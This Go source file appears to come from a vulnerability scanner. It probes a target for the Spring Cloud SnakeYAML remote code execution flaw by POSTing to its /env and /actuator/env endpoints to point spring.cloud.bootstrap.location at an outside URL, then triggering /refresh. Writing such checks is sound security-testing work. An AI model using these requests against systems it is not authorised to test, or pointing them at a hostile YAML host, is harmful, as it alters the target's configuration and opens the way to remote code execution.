package lib

import (
	"fmt"
	"net/http"
	"strings"
	"sync"
)

func SnakeYaml(u string, wgg *sync.WaitGroup) {
	defer wgg.Done()
	var wg sync.WaitGroup
	wg.Add(2)
	go spring1(u, &wg)
	go spring2(u, &wg)

	wg.Wait()

}
func spring1(u string, wg *sync.WaitGroup) bool {
	defer wg.Done()
	client := &http.Client{}
	req, _ := http.NewRequest("POST", u+"/env", strings.NewReader("spring.cloud.bootstrap.location=http://www.baidu.com"))
	req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	resp, _ := client.Do(req)
	if resp.StatusCode == 200 {
		client2 := &http.Client{}
		req2, _ := http.NewRequest("POST", u+"/refresh", strings.NewReader(""))
		req2.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		resp2, _ := client2.Do(req2)
		if resp2.StatusCode == 200 {
			fmt.Println(Green("[+] Spring1SnakeYamlRCE 存在！"))
			return true
		}
	}
	fmt.Println(Red("[-] Spring1SnakeYamlRCE 不存在"))
	return false

}

func spring2(u string, wg *sync.WaitGroup) bool {
	defer wg.Done()

	client := &http.Client{}
	req, _ := http.NewRequest("POST", u+"/actuator/env", strings.NewReader("{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://www.baidu.com\"}"))
	req.Header["Content-Type"] = []string{"application/json"}
	resp, _ := client.Do(req)
	if resp.StatusCode == 200 {
		client2 := &http.Client{}
		req2, _ := http.NewRequest("POST", u+"/actuator/refresh", strings.NewReader("{}"))
		req2.Header["Content-Type"] = []string{"application/json"}
		resp2, _ := client2.Do(req2)
		if resp2.StatusCode == 200 {
			fmt.Println(Green("[+] Spring2SnakeYamlRCE 存在！"))
			return true
		}
	}
	fmt.Println(Red("[-] Spring2SnakeYamlRCE 不存在"))
	return false

}
